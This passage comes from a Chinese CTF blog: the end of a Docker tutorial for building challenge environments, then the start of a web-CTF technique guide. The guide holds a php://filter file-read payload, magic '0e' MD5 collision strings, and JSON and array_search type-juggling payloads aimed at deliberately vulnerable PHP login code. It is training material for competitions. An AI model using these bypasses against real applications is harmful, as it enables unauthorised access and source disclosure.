卷会一直存在，直到没有任何容器在使用它<br></code></pre></td></tr></table></figure><h3 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h3><p>指定于外界交互的端口</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">格式：<br>    <span class="hljs-keyword">EXPOSE</span> &lt;port&gt; [&lt;port&gt;...]<br>示例：<br>    <span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span> <span class="hljs-number">443</span><br>    <span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br>    <span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">11211</span>/tcp <span class="hljs-number">11211</span>/udp<br>注：<br>　　<span class="hljs-keyword">EXPOSE</span>并不会让容器的端口访问到主机。要使其可访问，需要在docker <span class="hljs-keyword">run</span><span class="language-bash">运行容器时通过-p来发布这些端口，或通过-P参数来发布EXPOSE导出的所有端口</span><br></code></pre></td></tr></table></figure><h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><p>工作目录，类似于cd命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">格式：<br>    <span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /path/to/workdir</span><br>示例：<br>    <span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /a  (这时工作目录为/a)</span><br>    <span class="hljs-keyword">WORKDIR</span><span class="language-bash"> b  (这时工作目录为/a/b)</span><br>    <span class="hljs-keyword">WORKDIR</span><span class="language-bash"> c  (这时工作目录为/a/b/c)</span><br>注：<br>　　通过<span class="hljs-keyword">WORKDIR</span><span class="language-bash">设置工作目录后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT、ADD、COPY等命令都会在该目录下执行。在使用docker run运行容器时，可以通过-w参数覆盖构建时所设置的工作目录。</span><br></code></pre></td></tr></table></figure><p>找到一个比较有意思的图：</p><p><img src="https://s2.ax1x.com/2020/02/19/3AtDRe.png" alt="3AtDRe.png"></p><p>新建一个文件，名为Dockerfile，编写完内容后，在当前目录执行：</p><p><code>$ docker build .</code></p><p>即可获得dockerfile所对应的镜像，这里可以用-t参数给镜像打上标签</p><p><code>$ docker build –t newimage:1.0 .</code></p><p>运行镜像：</p><p><code>$docker run –it –p 8080:80 newimage:1.0 </code></p><p><code>-i</code>：是开启标准输入，<code>-t</code> : 是分配tty，<code>-p</code>是转发端口，本机端口:容器端口</p><p>如果要后台运行，可以直接输入 <code>-d</code>:</p><p><code>$docker run –d –p 8080:80 newimage:1.0 </code></p><h1 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h1><p>有了image，但是启动参数啥的也没法方便的告诉别人，那就把这些也写到一个文件里。<br><a href="https://docs.docker.com/compose/">Overview of Docker Compose</a></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-symbol">services:</span><br><span class="hljs-symbol">  web:</span><br><span class="hljs-symbol">    build:</span> .<br><span class="hljs-symbol">    image:</span> newimage:<span class="hljs-number">1.0</span><br><span class="hljs-symbol">    ports:</span><br>    - <span class="hljs-string">&quot;8080:80&quot;</span><br><span class="hljs-symbol">    stdin_open:</span> true<br><span class="hljs-symbol">    tty:</span> true<br></code></pre></td></tr></table></figure><h2 id="yml"><a href="#yml" class="headerlink" title="yml"></a>yml</h2><ul><li>大小写敏感</li><li>使用缩进表示层级关系</li><li>禁止使用tab缩进，只能使用空格键</li><li>缩进长度没有限制，只要元素对齐就表示这些元素属于一个层级</li><li>使用#表示注释</li><li>字符串可以不用引号标注</li></ul><p>编写完之后在当前目录运行：</p><p><code>docker-compose up -d</code></p><h2 id="更复杂的docker-compose"><a href="#更复杂的docker-compose" class="headerlink" title="更复杂的docker-compose"></a>更复杂的docker-compose</h2><p><img src="https://s2.ax1x.com/2020/02/19/3AU0jH.png" alt="3AU0jH.png"></p><p><a href="https://github.com/wonderkun/CTF_web/blob/master/web400-13/docker-compose.yml">https://github.com/wonderkun/CTF_web/blob/master/web400-13/docker-compose.yml</a></p><p>更完整的CTF Docker可以参考国赛的demo</p><h1 id="PHP代码审计或SQL注入类-LAMP"><a href="#PHP代码审计或SQL注入类-LAMP" class="headerlink" title="PHP代码审计或SQL注入类(LAMP)"></a>PHP代码审计或SQL注入类(LAMP)</h1><p>这个只要有lamp环境就可以了，这里以代码审计为主，使用的是 <code>tutum/lamp</code>。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> tutum/lamp <span class="hljs-comment"># pull下tutum/lamp 镜像</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.aliyun.com/g&quot;</span> /etc/apt/sources.list <span class="hljs-comment"># 换源</span></span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update -y</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> /var/www/html/phpinfo.php /var/www/html/LICENSE  /var/www/html/README.md /var/www/html/logo.png</span><br><span class="hljs-comment"># 删除环境原本的一堆东西</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./index.php /var/www/html/</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> css /var/www/html/css/</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> img /var/www/html/img/</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> js /var/www/html/js/</span><br><span class="hljs-comment"># 源码copy进去目录，可自行修改</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /var/www/html/</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> www-data:www-data /var/www/html/* -R</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> -R 755 /var/www/html/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> service apache2 restart</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;apachectl&quot;</span>, <span class="hljs-string">&quot;-DFOREGROUND&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>若 mysql 出现连接错误且是启动有问题，可以参考<a href="https://ivenwings.github.io/2020/02/18/docker_lamp%E7%8E%AF%E5%A2%83%E4%B8%8Bmysql%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/">另一篇博客</a>。</p><p>当然也可以写上 <code>docker-compose.yml</code>解决这个问题。</p><h1 id="挖坑-TO-DO"><a href="#挖坑-TO-DO" class="headerlink" title="挖坑 TO-DO"></a>挖坑 TO-DO</h1><p>To be continue…</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web In CTF</title>
    <link href="/2019/07/14/Web-In-CTF/"/>
    <url>/2019/07/14/Web-In-CTF/</url>
    
    <content type="html"><![CDATA[<h1 id="Web-In-CTF"><a href="#Web-In-CTF" class="headerlink" title="Web In CTF"></a>Web In CTF</h1><h2 id="常见套路"><a href="#常见套路" class="headerlink" title="常见套路"></a>常见套路</h2><ul><li>爆破，包括<code>md5</code>、爆破随机数、验证码识别等</li><li>绕<code>WAF</code>，包括花式绕<code>Mysql</code>、绕文件读取关键词检测之类拦截</li><li>花式玩弄几个PHP特性，包括弱类型，<code>strpos</code>和<code>===</code>，反序列化 <code>destruct</code>、<code>\0</code>截断</li><li>各种找源码技巧，包括<code>git</code>、<code>svn</code>、<code>xxx.php.swp</code>、<code>*www*.(zip|tar.gz|rar|7z)</code>、<code>xxx.php.bak</code></li><li>文件上传，包括花式文件后缀 <code>.php345</code> ，<code>.inc</code>， <code>.phtml</code>， <code>.phpt</code>， <code>.phps</code>、各种文件内容检测<code>&lt;?php</code>, <code>&lt;?</code>,  <code>&lt;%</code>,  <code>&lt;script language=php&gt;</code>、花式解析漏洞</li><li><code>Mysql</code>类型差异，包括和PHP弱类型类似的特性，<code>0x</code>、<code>0b</code>、<code>1e</code>之类，<code>varchar</code>和<code>integer</code>相互转换</li><li><code>open_basedir</code>、<code>disable_functions</code>花式绕过技巧，包括<code>dl</code>、<code>mail</code>、<code>imagick</code>、<code>bash</code>漏洞、<code>DirectoryIterator</code>及各种二进制选手插足的方法</li><li>社工，包括花式查社工库、微博、QQ签名、<code>whois</code></li><li><code>windows</code>特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、<code>::$DATA</code>，冒号截断</li><li>XSS，各种浏览器<code>auditor</code>绕过、富文本过滤黑白名单绕过、<code>flash xss</code></li><li>XXE，各种XML存在地方（<code>rss</code>&#x2F;<code>word</code>&#x2F;流媒体）、各种XXE利用方法（SSRF、文件读取）</li><li>HTTP协议，花式IP伪造<code> X-Forwarded-For</code>&#x2F;<code>X-Client-IP</code>&#x2F;<code>X-Real-IP</code>&#x2F;<code>CDN-Src-IP</code>、花式改UA，花式藏FLAG、花式分析数据包</li></ul><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><p>在线上CTF赛事的Web题目中，网页源代码是一个很重要的思路来源，按F12或右键查看源代码即可。</p><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>爬虫协议，有时可以通过它看见一些重要的目录。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">User-agent: *<br>Disallow: <span class="hljs-regexp">/images/</span><br>Disallow: <span class="hljs-regexp">/f1ag.txt/</span><br>Disallow: /tips.php<br></code></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>一般在右键源代码中，有时注释隐藏着重要的信息或者tips，或者出题者写下的思路。</p><h3 id="备份文件源码泄漏"><a href="#备份文件源码泄漏" class="headerlink" title="备份文件源码泄漏"></a>备份文件源码泄漏</h3><p>​常见备份文件后缀：</p><ul><li><p><code>.rar</code></p></li><li><p><code>.zip</code></p></li><li><p><code>.7z</code></p></li><li><p><code>.tar.gz</code></p></li><li><p><code>.bak</code></p></li><li><p><code>.swp</code></p></li><li><p><code>.txt</code></p></li><li><p><code>.html</code></p></li><li><p><code>linux</code>中可能以” <code>~</code> “ 结尾</p></li><li><p><code>ng</code>源码泄露，<code>git</code>源码泄露，<code>DS_Store</code>文件泄漏，网站备份压缩文件，SVN导致文件泄露，WEB-INF&#x2F;web.xml泄露，CVS泄漏等，可参考以下资料：</p><p><a href="https://www.cnblogs.com/xishaonian/p/7628153.html">CTF中常见Web源码泄露总结</a></p><p><a href="http://www.s2.sshz.org/post/source-code-leak/">常见Web源码泄露解析</a></p><p><a href="https://zhuanlan.zhihu.com/p/21296806">文件泄露</a></p></li></ul><h3 id="include漏洞"><a href="#include漏洞" class="headerlink" title="include漏洞"></a>include漏洞</h3><p>遇到<code>php</code>代码中有<code>include($file)</code>的，一般和 <code>php://input</code>或者<code>php://filter</code>有关，​<code>$file</code>值如果是<code>php://input</code>，就要用post表单构造数据，如果是<code>php://filter</code>，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encoding/resource=文件名(如index.php)</span><br>php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php</span><br></code></pre></td></tr></table></figure><h2 id="抓包-x2F-HTTP"><a href="#抓包-x2F-HTTP" class="headerlink" title="抓包&#x2F;HTTP"></a>抓包&#x2F;HTTP</h2><h3 id="GET-amp-POST"><a href="#GET-amp-POST" class="headerlink" title="GET&amp;POST"></a>GET&amp;POST</h3><p>Get和Post操作是传参的基本操作，也是CTF中很常见的常规操作。</p><p>GET：在<code>url</code>中提交参数，如<code>/index.php?a=1</code></p><p>POST：可通过<code>hackbar</code>或抓包插入post数据提交</p><p>最直接的区别：</p><p>GET请求的参数是放在URL里的，POST请求参数是放在请求body里的。</p><h3 id="HTTP头部绕过姿势"><a href="#HTTP头部绕过姿势" class="headerlink" title="HTTP头部绕过姿势"></a>HTTP头部绕过姿势</h3><ul><li><p>如果提示需要本地ip或指定ip才能访问，则可在报文头部添加以下几种常用信息段：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">X-Client-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Client-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br>(ip地址可以根据需要修改)<br></code></pre></td></tr></table></figure></li><li><p>如果需要验证网页来源，如一定要从谷歌跳转过来的页面才允许访问，则可在报文头部添加：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://www.google.com<br></code></pre></td></tr></table></figure></li><li><p>如果网页需要验证cookie，我们可以在http头部加入：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>u = stupid;<br></code></pre></td></tr></table></figure></li><li><p>除了以上几种常见的情况，还需根据具体情况来使用不同的操作</p></li></ul><h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><h3 id="php弱类型"><a href="#php弱类型" class="headerlink" title="php弱类型"></a>php弱类型</h3><h4 id="x3D-x3D-与-x3D-x3D-x3D"><a href="#x3D-x3D-与-x3D-x3D-x3D" class="headerlink" title="&#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D;</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span> ;<br><span class="hljs-variable">$a</span> === <span class="hljs-variable">$b</span> ;<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</span><br><span class="hljs-comment">// == 在进行比较的时候，会先将字符串类型转化成相同，再比较</span><br></code></pre></td></tr></table></figure><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span> == <span class="hljs-number">0</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span>== <span class="hljs-number">1</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>== <span class="hljs-number">1</span>); <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>== <span class="hljs-number">0</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//上述代码可自行测试</span><br>    <br> <span class="hljs-comment">// 观察上述代码</span><br> <span class="hljs-comment">//&quot;admin&quot;==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等</span><br> <span class="hljs-comment">//&quot;1admin&quot;==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，即是&quot;admin1&quot;被转化成了0,为什么呢？？</span><br> <span class="hljs-comment">//&quot;0e123456&quot;==&quot;0e456789&quot;相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</span><br></code></pre></td></tr></table></figure><p><code>php</code>手册：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含&#x27;.&#x27;,&#x27;e&#x27;,&#x27;E&#x27;并且其数值值在整形的范围之内</span><br><span class="hljs-comment">该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span> + <span class="hljs-string">&quot;10.5&quot;</span>; <span class="hljs-comment">// $test=11.5(float)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;-1.3e3&quot;</span>; <span class="hljs-comment">//$test=-1299(float)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;bob-1.3e3&quot;</span>;<span class="hljs-comment">//$test=1(int)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;2admin&quot;</span>;<span class="hljs-comment">//$test=3(int)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;admin2&quot;</span>;<span class="hljs-comment">//$test=1(int)</span><br><span class="hljs-meta">?&gt;</span><br>    <br>So that<span class="hljs-string">&#x27;s why &quot; &quot;admin1&quot;==1 =&gt;False &quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/12ScvV.png" alt="12ScvV.png"></p><h4 id="md5绕过-Hash比较缺陷"><a href="#md5绕过-Hash比较缺陷" class="headerlink" title="md5绕过(Hash比较缺陷)"></a>md5绕过(Hash比较缺陷)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$logined</span> = <span class="hljs-literal">true</span>;<br>    <span class="hljs-variable">$Username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$Username</span>)) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>) ) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$Username</span>) != <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$logined</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;successful&quot;</span>;<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login failed!&quot;</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句 </p><p>介绍一批md5开头是0e的字符串</p><p><strong>0e在比较的时候会将其视作为科学计数法</strong>，所以无论0e后面是什么，0的多少次方还是0。</p><p>键入**md5(‘240610708’) &#x3D;&#x3D; md5(‘QNKCDZO’)**成功绕过！</p><p>收集md5开头是0e的字符串（来源于网络）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">QNKCDZO<br><span class="hljs-number">0e830400451993494058024219903391</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br>  <br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br>  <br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br>  <br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br>  <br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br>  <br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br>  <br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br></code></pre></td></tr></table></figure><h4 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>]);<br>    <span class="hljs-variable">$key</span> =<span class="hljs-string">&quot;*********&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$message</span>-&gt;key == <span class="hljs-variable">$key</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>    &#125;<br> &#125;<br> <span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;~~~~&quot;</span>;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输入一个json类型的字符串，json_decode函数解成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，<strong>但是可以利用0&#x3D;&#x3D;”admin”这种形式绕过</strong>.</p><p>**最终payload **</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">message=<span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h4 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search is_array绕过"></a>array_search is_array绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]))&#123;<span class="hljs-keyword">exit</span>();&#125;<br><span class="hljs-variable">$test</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$test</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]=<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$test</span>[<span class="hljs-variable">$i</span>]);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-variable">$test</span>)===<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">payload: test[]=<span class="hljs-number">0</span><span class="hljs-comment">//可以绕过</span><br></code></pre></td></tr></table></figure><p>官方手册对array_search的介绍</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">array_search</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span> , <span 